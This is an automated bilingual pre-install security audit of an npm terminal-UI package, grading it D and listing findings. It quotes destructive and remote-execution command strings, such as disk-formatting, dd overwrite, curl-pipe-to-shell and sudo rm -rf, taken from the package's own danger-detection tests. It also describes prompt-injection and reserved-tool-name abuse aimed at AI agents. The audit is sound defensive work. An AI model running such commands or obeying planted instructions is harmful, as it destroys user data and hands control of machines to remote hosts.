> 批量压测 / Batch stress test · ★ 280 · `huiliyi37/dsh-tianshu-tui`
> https://github.com/huiliyi37/dsh-tianshu-tui · audited in 3.2s
# 安装前体检 / Pre-install audit: @huiliyi37/dsh-lsp@0.1.0-rc.1

**信任评级 / Trust grade: D** (评分 / score 0/100 — 拒绝：存在严重风险信号 / refused: critical risk signals)

> **拒绝安装。** 该来源达到了配置的拒绝阈值。请先修复严重问题；若你已读过报告并接受风险，可把该包加入 `install.allow`。 / **Install refused.** This source met the configured refusal floor. Fix the critical findings, or add the package to `install.allow` if you have read them and accept the risk.

> **部分扫描。** 大小或文件数上限使分析提前结束，因此该评级只覆盖已读取的部分。 / **Partial scan.** A size or file-count cap stopped the analysis early, so this grade covers only the part that was read.

- 来源 / Source: `https://codeload.github.com/huiliyi37/dsh-tianshu-tui/tar.gz/HEAD` (URL / url)
- 已分析文件：592 个（4.9 MiB） / Files analysed: 592 (4.9 MiB)
- 内容摘要 / Content digest: `8e868ffac304dc638fe8da3c8c5788f4…`
- 体检时间 / Audited at: 2026-09-20T09:53:27.807Z

## 最严重的风险 / Most severe risk

**内置破坏性文件系统命令 / Ships a destructive filesystem command** `destructive.shipped-command`

中 它会执行在本机上无法撤销的操作。
EN It runs an operation that cannot be undone on this machine.

该包会访问的目标：`registry.npmjs.org`、`registry.npmmirror.com`、`registry.npmjs.orghttps:`、`www.apache.org`、`github.com`、`opencollective.com`、`tidelift.com`、`paulmillr.com` / Destinations this package reaches: `registry.npmjs.org`, `registry.npmmirror.com`, `registry.npmjs.orghttps:`, `www.apache.org`, `github.com`, `opencollective.com`, `tidelift.com`, `paulmillr.com`

- 中 其中一部分经过混淆，源码看不出真正执行的是什么。
  EN Part of it is obfuscated, so the source does not show what actually executes.
- 中 它还安排了之后继续运行，所以仅仅卸载这个包并不够。
  EN It also arranges to run again later, so removing the package is not enough on its own.
- 中 本次扫描不完整，因此可能还有内容根本没被读到。
  EN The scan was partial, so there may be more that was never read.

决定该评级的规则命中于 `src/format/permission-diff.ts:107`；完整列表见下方「发现」。 / The rule that decided the grade fired at `src/format/permission-diff.ts:107`; the full list is under Findings below.

## 安装期脚本 / Install-time scripts

未声明。该包不会在安装它的机器上自动执行任何东西。 / None declared. Nothing in this package runs automatically on the machine that installs it.

## 该插件能触及什么 / What this plugin can reach

- **读取的文件路径 / File paths read:** `node_modules/@deepseek-ai/dsh-skill-filesystem/node_modules/readdirp`, `node_modules/readdirp`, `bin.js`, `@deepseek-ai/dsh/lib/bin.js`, `vendor/dsh-runtime/node_modules`, `package.json`, `node:fs/promises`, `pnpm-lock.yaml`, `package-lock.json`, `yarn.lock`, `.package-lock.json`, `node_modules/.package-lock.json` （另有 5 项） / (+5 more)
- **写入的文件路径 / File paths written:** `vendor/dsh-runtime/node_modules`, `node:fs/promises`, `notes.md`, `mention-parser.ts`, `// mention parser`, `src.ts`, `// src`, `src-test.ts`, `// src test`, `other.ts`, `// other`, `osrc.ts` （另有 17 项） / (+17 more)
- **派生的命令 / Commands spawned:** `node:child_process`, `inherit`, `git`, `ls-files`, `--cached`, `--others`, `--exclude-standard`, `pbpaste`, `wl-paste`, `xclip`, `-selection`, `clipboard` （另有 37 项） / (+37 more)
- **连接的域名 / Domains contacted:** `registry.npmjs.org`, `registry.npmmirror.com`, `registry.npmjs.orghttps:`, `www.apache.org`, `github.com`, `opencollective.com`, `tidelift.com`, `paulmillr.com`, `nodejs.org`, `${abs`, `api.deepseek.com`, `example.com` （另有 12 项） / (+12 more)
- **读取的环境变量 / Environment variables read:** `LocalAppData`, `DSH_HOME`, `DEEPSEEK_API_KEY`, `LIFT`, `COVER_MIN`, `COLORFGBG`, `process.env (every variable)`, `RIVET_DEBUG`, `RIVET_TUI_HARDWARE_CURSOR`, `ComSpec`, `DEEPSEEK_BASE_URL`, `RIVET_AMBIGUOUS_WIDTH` （另有 8 项） / (+8 more)

## 发现 / Findings

### 严重 / CRITICAL (1)

- **严重 / CRITICAL** `destructive.shipped-command` — 内置破坏性文件系统命令 / Ships a destructive filesystem command
  中 抹掉用户主目录、根文件系统或分区的命令出现在可执行内容里，而不是文档描述中。即便有条件判断保护，这种原语也绝不该被塞进插件里。
  EN A command that erases a home directory, a root filesystem or a partition appears in executable content rather than in prose. Even guarded by a condition, it is a primitive that should never travel inside a plugin.
  - `src/format/permission-diff.ts:107` — `{ pattern: /\bmkfs(?:\.\w+)?\b/, label: '文件系统格式化' },`
  - `tests/permission-diff.spec.ts:288` — `it('detectDangerPatterns：rm -rf / curl|sh / fork 炸弹等命中标签；安全命令空数组', () => {`
  - `tests/permission-diff.spec.ts:294` — `expect(detectDangerPatterns('mkfs.ext4 /dev/sda')).toEqual(['文件系统格式化'])`
  - `tests/permission-diff.spec.ts:295` — `expect(detectDangerPatterns('dd if=/dev/zero of=/dev/sda bs=1M')).toEqual(['dd 覆写块设备'])`
  中 修复：删除该命令。插件如果必须清理，应把删除限定在它自己创建的目录，并以包根目录为基准解析这个路径。
  EN Fix: Delete the command. If a plugin must clean up, restrict deletion to a directory it created and resolve that path from the package root.

### 高 / HIGH (3)

- **高 / HIGH** `exfil.clipboard-read-then-callback` — 同一个包内既有剪贴板读取又有对外请求 / Clipboard read and an outbound request in the same package
  中 该包读取系统剪贴板，同时发起对外请求。剪贴板里有刚刚复制过的密码和令牌，而这个包里没有任何东西能解释这两种行为为何同时存在。
  EN The package reads the system clipboard and also makes outbound requests. Clipboards hold passwords and tokens that were copied moments earlier, and nothing in this package explains why the two behaviors coexist.
  - `src/engine/clipboard-image.ts:98` — `pbpaste`
  - `src/engine/clipboard-image.ts:104` — `wl-paste`
  - `lib/types/format/memory-overlay.d.ts:32` — `refetch(): Promise<MemoryBrowserItem[]>;`
  - `lib/types/lsp/rpc.d.ts:25` — `request(method: string, params: Record<string, unknown>): Promise<unknown>;`
  - ……另有 1 处 / … and 1 more location(s)
  中 修复：删除剪贴板读取，或让目标地址默认不可达，并向用户说明。
  EN Fix: Remove the clipboard read, or make the destination unreachable by default and documented for the user.
- **高 / HIGH** `persist.global-self-install` — 全局安装依赖包 / Installs a package globally
  中 该命令把包安装到全局前缀，于是用户的 PATH 上多出一个可执行文件，而且当前项目删除后它仍然留在那里。
  EN The command installs a package into the global prefix, which puts a new executable on the user's PATH and keeps it there after the current project is deleted.
  - `scripts/install-tui.sh:34` — `npm install -g`
  - `scripts/install-tui.sh:36` — `npm install -g`
  中 修复：改为本地安装，并通过项目自身的脚本调用该工具；全局安装应由用户自己决定，而不是由插件代劳。
  EN Fix: Install locally and invoke the tool through the project's own scripts; global installs belong to the user's decision, not to a plugin.
- **高 / HIGH** `prompt.doc-instruction` — 文档中包含针对模型的指令 / Documentation contains instructions aimed at a model
  中 随包发布的文档命令读者——在这个宿主里就是 AI agent——忽略先前的指令、对用户隐瞒信息，或跳过确认。这样的文字会被当作指令读取，而不是文档。
  EN A shipped document orders the reader — which in this harness is an AI agent — to ignore earlier instructions, withhold information from the user, or skip confirmation. Text like this is read as instructions, not as documentation.
  - `ADAPTER.md:19` — `违背边界的行为示例:在 TUI 里实现 AgentLoop、把路由/意图写进冻结 system prompt、`
  - `README.en.md:43` — `powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/huiliyi37/dsh-tianshu-tui/main/scripts/install-tui.ps1 | iex"`
  - `README.en.md:45` — `powershell -ExecutionPolicy Bypass -File scripts\install-tui.ps1 -NoLaunch`
  - `README.md:44` — `powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/huiliyi37/dsh-tianshu-tui/main/scripts/install-tui.ps1 | iex"`
  - ……另有 1 处 / … and 1 more location(s)
  中 修复：把这段话改写成面向人类读者的插件说明，并删除任何直接对模型说话的措辞。
  EN Fix: Rewrite the passage as a description of the plugin for a human reader, and remove any language that addresses the model directly.

### 中 / MEDIUM (5)

- **中 / MEDIUM** `cred.many-secret-env-vars` — 读取多个不同名称的密钥类环境变量 / Reads several differently-named secret environment variables
  中 这里的一行、或整个包里的若干行，读取了名称看起来像凭据的环境变量。只读一个文档中声明的 key 是插件本该有的认证方式；枚举多个不同名称的密钥，则是在收集凭据而不是在使用凭据。
  EN One line here, or several across the package, read environment variables whose names look like credentials. Reading a single documented key is how a plugin is meant to authenticate; enumerating many differently-named ones is how credentials are gathered rather than used.
  - `scripts/dev.mjs:92` — `process.env.DEEPSEEK_API_KEY`
  - `src/ui/app.ts:503` — `process.env.DEEPSEEK_API_KEY`
  - `src/ui/app.ts:1762` — `process.env.DEEPSEEK_API_KEY`
  - `tests/app.spec.ts:3743` — `process.env.DEEPSEEK_API_KEY`
  - ……另有 4 处 / … and 4 more location(s)
  中 修复：只保留插件确实需要且有文档说明的变量，删掉与任何功能无关的密钥读取。
  EN Fix: Keep to the variables this plugin documents and needs, and delete reads of keys it has no feature for.
- **中 / MEDIUM** `exfil.clipboard-read` — 读取系统剪贴板 / Reads the system clipboard
  中 该行通过 `pbpaste`、`xclip`、`wl-paste`、`Get-Clipboard` 或 `clipboardy` 读取剪贴板。剪贴板里经常放着刚刚复制过的密码、令牌和私密文本。
  EN The line reads the clipboard through `pbpaste`, `xclip`, `wl-paste`, `Get-Clipboard` or `clipboardy`. Clipboards routinely hold passwords, tokens and private text that were copied moments earlier.
  - `src/engine/clipboard-image.ts:98` — `pbpaste`
  - `src/engine/clipboard-image.ts:104` — `wl-paste`
  - `src/engine/clipboard-image.ts:107` — `xclip`
  - `src/engine/clipboard-image.ts:112` — `Get-Clipboard`
  - ……另有 11 处 / … and 11 more location(s)
  中 修复：通过插件配置向用户索取该值，而不是读取剪贴板上恰好存在的内容。
  EN Fix: Ask the user for the value through the plugin config instead of reading whatever happens to be on the clipboard.
- **中 / MEDIUM** `net.excessive-distinct-hosts` — 包连接的不同主机数量多得不合常理 / Package contacts an implausible number of distinct hosts
  中 对外目标涉及的主机数量超出插件合理所需。这种大面积铺开，正是让遥测、中继和投放服务躲在每一个都看似平常的端点之间的办法。
  EN The package reaches 23 distinct remote hosts (github.com, opencollective.com, paulmillr.com, registry.npmjs.org, registry.npmjs.orghttps:, registry.npmmirror.com, tidelift.com, www.apache.org, …). That is far more than a plugin needs, and the report cannot attribute the surplus to any documented feature.
  - `lib/types/self-update.d.ts:67` — `https://registry.npmjs.org`
  - `lib/types/self-update.d.ts:67` — `https://registry.npmmirror.com`
  - `lib/types/self-update.d.ts:67` — `https://registry.npmjs.orghttps://registry.npmmirror.com`
  - `LICENSE:3` — `http://www.apache.org/licenses/`
  中 修复：把目标列表收敛到有文档说明的服务，删除插件无法给出理由的任何端点。
  EN Fix: Reduce the destination list to the documented service, and remove any endpoint the plugin cannot justify.
- **中 / MEDIUM** `prompt.concealed-instruction` — 把文本藏在注释或不可见字符中 / Hides text in a comment or invisible characters
  中 该行把内容藏在 HTML 注释里，或藏在零宽字符与双向控制字符之后，这些内容在 diff 或渲染后的文档中什么都看不见，却仍会作为文本被读取。
  EN The line conceals content either in an HTML comment or behind zero-width and bidirectional control characters, which render as nothing in a diff or a rendered document while still being read as text.
  - `tests/input-line.spec.ts:147` — `const family = '👨‍👩‍👧' // ZWJ 簇：8 code units / 1 grapheme`
  - `tests/term-width.spec.ts:434` — `const sample = '你好世界 aB9！🎉👨‍👩‍👧 é éｱｲｳ ÂÂÂ ……'`
  中 修复：删除被隐藏的文本和不可见字符；审查者看不到的东西就不该出现在发布的包里。
  EN Fix: Delete the concealed text and the invisible characters; anything a reviewer cannot see does not belong in a shipped package.
- **中 / MEDIUM** `supply.unscannable-payload-with-network` — 随包携带不可读载荷且存在对外请求 / Unreadable payload shipped alongside outbound requests
  中 该包携带了无法按文本读取的大文件——二进制文件、压缩包或压缩过的数据块——同时又建立对外连接，因此它发送的内容中有一部分是本次审计从未检查过的。
  EN 1 shipped file(s) are 64 KiB or larger and were not read as text, the largest being docs/promo.png at 474 KiB, while this package also makes outbound requests. Whatever those files contain leaves the machine unexamined.
  - `docs/promo.png` — `485441 bytes not decoded as text`
  - `lib/types/format/memory-overlay.d.ts:32` — `refetch(): Promise<MemoryBrowserItem[]>;`
  - `lib/types/lsp/rpc.d.ts:25` — `request(method: string, params: Record<string, unknown>): Promise<unknown>;`
  中 修复：删除这个不透明载荷，或说明它究竟是什么；审计无法为自己读不到的字节背书。
  EN Fix: Remove the opaque payload or document what it is; an audit cannot vouch for bytes it could not read.

### 低 / LOW (7)

- **低 / LOW** `cred.credential-path-mention` — 出现凭据路径但并未读取 / Credential path appears without being read
  中 某一行提到了敏感路径，却没有执行读取。报告记录这一条，是为了把仅仅出现在日志或错误信息中的路径，与真正被打开的路径区分开。
  EN A sensitive path is named on a line that performs no read. This is reported so the report can distinguish a path that is merely echoed in a log or error message from one that is actually opened.
  - `scripts/dev.mjs:93` — `const envFile = join(homedir(), '.dsh', '.env')`
  - `scripts/dev.sh:25` — `if [ -z "${DEEPSEEK_API_KEY:-}" ] && [ -f "$HOME/.dsh/.env" ]; then`
  - `scripts/dev.sh:26` — `set -a; . "$HOME/.dsh/.env"; set +a`
  - `src/format/welcome.ts:218` — `const env = { ...input.env, cols: width }`
  - ……另有 17 处 / … and 17 more location(s)
  中 修复：确认该路径只出现在文档或提示信息中；如果它随后被传给读取调用，那一行就会触发更严重级别的读取规则。
  EN Fix: Confirm the path is only used in documentation or messaging; if it is later passed to a read call, expect the higher-severity read rules to fire on that line.
- **低 / LOW** `destructive.recursive-delete-system-path` — 递归删除指向用户主目录或系统目录 / Recursive delete aimed at a home or system directory
  中 递归删除的目标是用户主目录或系统路径，一旦变量写错、展开为空或缺少判空保护，被销毁的就是用户数据而不是包自己的构建产物。
  EN A recursive delete targets a home directory or a system path, so a wrong variable, an empty expansion or a missing guard destroys user data instead of the package's own build output.
  - `tests/permission-diff.spec.ts:288` — `it('detectDangerPatterns：rm -rf / curl|sh / fork 炸弹等命中标签；安全命令空数组', () => {`
  中 修复：只删除包在自己目录下创建的路径，并在解析出的路径不位于该目录内时拒绝执行。
  EN Fix: Delete only paths the package created under its own directory, and refuse to run when the resolved path is not inside it.
- **低 / LOW** `harness.reserved-tool-name` — 用保留名称注册工具 / Registers a tool under a reserved name
  中 注册的工具使用了宿主内置工具的名字，模型可能自以为在调用核心实现，实际调用的却是这一份，工具调用记录也随之失真。
  EN A tool is registered with the name of a built-in harness tool, so the model may call this implementation while believing it is calling the core one, and the tool-call record becomes misleading.
  - `tests/app-regression.spec.ts:153` — `{ agent: { session: { id: app.sessionId ?? agentA.session.id } }, toolName: 'bash' },`
  - `tests/app.spec.ts:1652` — `{ agent: { session: { id: owner.id } }, toolName: 'bash', reason: 'sandbox' },`
  - `tests/app.spec.ts:1685` — `{ agent: { session: { id: owner.id } }, toolName: 'bash' },`
  - `tests/app.spec.ts:1691` — `{ agent: { session: { id: owner.id } }, toolName: 'bash' },`
  - ……另有 41 处 / … and 41 more location(s)
  中 修复：给工具加上插件专属前缀重命名，不要占用保留名称。
  EN Fix: Rename the tool with a plugin-specific prefix instead of claiming a reserved name.
- **低 / LOW** `obf.dynamic-require` — require 或 import 了动态计算的模块路径 / Requires or imports a computed module path
  中 模块路径是计算出来的而非字面量，真正被加载的包由运行时决定，光看 import 语句根本查不出来。
  EN The module path is computed rather than written literally, so the package that actually gets loaded is decided at runtime and cannot be checked by reading the imports.
  - `tests/btw-composition.spec.ts:196` — `async import(specifier: string) {`
  - `tests/bundle-contract.spec.ts:140` — `"for (const p of ['@huiliyi37/dsh-lsp','@huiliyi37/dsh-lsp-local','@huiliyi37/dsh-tool-lsp']) await import(p)",`
  - `tests/loader-composition.spec.ts:206` — `async import(specifier: string) {`
  - `tests/preset-join-composition.spec.ts:182` — `async import(specifier: string) {`
  - ……另有 1 处 / … and 1 more location(s)
  中 修复：使用静态的 import 说明符，或用一张显式表把已知键映射到静态 import。
  EN Fix: Use a static import specifier, or an explicit table mapping known keys to static imports.
- **低 / LOW** `priv.curl-pipe-shell` — 把下载内容直接管道给 shell / Pipes a download straight into a shell
  中 一步完成“拉取脚本并执行”，运行的就是远端服务器当时返回的任何内容；既没有可计算哈希、可审查、可固定版本的产物，服务器一旦被攻破就等于这台机器被攻破。
  EN Fetching a script and executing it in one step runs whatever the remote server returns at that moment; there is no artifact to hash, review or pin, and a compromise of the server becomes a compromise of this machine.
  - `tests/permission-diff.spec.ts:288` — `curl|sh`
  - `tests/permission-diff.spec.ts:291` — `curl https://x.sh | sh`
  - `tests/permission-diff.spec.ts:292` — `wget -qO- https://x | sudo bash`
  中 修复：先下载产物、校验其校验和，再执行校验通过的文件；绝不要把下载内容管道给解释器。
  EN Fix: Download the artifact, verify its checksum, and execute the verified file; never pipe a download into an interpreter.
- **低 / LOW** `priv.sudo-invocation` — 通过 sudo 提权 / Escalates with sudo
  中 该行通过 `sudo` 执行命令，意味着这个以用户级工具身份安装的插件在索要 root 权限，而用户事先看不到提权提示。
  EN The line runs a command through `sudo`, so the plugin is asking for root on a machine where it was installed as a user-level tool and where the user cannot see the escalation prompt in advance.
  - `tests/permission-diff.spec.ts:283` — `expect(commandPrefixOf(' sudo rm -rf /x')).toBe('sudo')`
  - `tests/permission-diff.spec.ts:292` — `expect(detectDangerPatterns('wget -qO- https://x | sudo bash')).toEqual(['远程脚本管道执行'])`
  中 修复：去掉提权，把任何需要特权的步骤写成一条由用户主动执行的独立命令并加以说明。
  EN Fix: Remove the escalation and document any privileged step as a separate command the user runs deliberately.
- **低 / LOW** `supply.foreign-registry` — 仓库或 scope 覆盖指向 npmjs 之外 / Registry or scope override points away from npmjs
  中 某个 registry 或 `_authToken` 条目指向的服务器并非 npmjs。随包发布的 `.npmrc` 或 `publishConfig` 配置把解析重定向后，所有依赖拉取都会来自用户并未选择的主机。
  EN A registry or `_authToken` entry names a server that is not npmjs. A shipped `.npmrc` or `publishConfig` block that redirects resolution makes every dependency fetch come from a host the user did not choose.
  - `tests/self-update.spec.ts:306` — `expect(npmRegistryCandidates({ DSH_TUI_UPDATE_REGISTRY: 'https://r.local' })).toEqual(['https://r.local'])`
  - `tests/self-update.spec.ts:307` — `expect(npmRegistryCandidates({ DSH_TUI_UPDATE_REGISTRY: 'https://a , https://b' })).toEqual(['https://a', 'https://b'])`
  中 修复：删除该覆盖；选择仓库本就是用户自己的配置，不该由被安装的包决定。
  EN Fix: Remove the override; registry selection belongs to the user's own configuration, not to the package being installed.

_按类别 / By category:_ 破坏性 / destructive 2 · 数据外传 / exfiltration 2 · 提示注入 / prompt injection 2 · 凭据读取 / credential access 2 · 供应链 / supply chain 2 · 提权 / privilege 2 · 持久化 / persistence 1 · 网络回调 / network callbacks 1 · 滥用宿主环境 / harness abuse 1 · 混淆 / obfuscation 1

## 扫描说明 / Scan notes

- stripped the archive's single top-level directory `dsh-tianshu-tui-HEAD/`
- skipped assets/welcome-blue-source.png: 982054 bytes exceeds the 524288-byte per-file cap
- skipped assets/welcome-star-source.png: 1226552 bytes exceeds the 524288-byte per-file cap
- skipped lib/index.js: 1086245 bytes exceeds the 524288-byte per-file cap
- not scanned (binary, contents unreadable as text): docs/promo.png, docs/tui-screenshot.jpg
- outbound fetching was permitted for this audit
- grade forced to D by a critical finding: destructive.shipped-command — Ships a destructive filesystem command
- grade D is at or below the install floor D: this source is refused

---

高评级表示这份规则目录中没有命中，并不等于该包安全。静态分析看不到运行期才拼装出来的行为；部分扫描已在上方标注。 / A high grade means no rule in this catalog fired, not that the package is safe. Static analysis cannot see behavior assembled at runtime, and a partial scan is marked as such above.
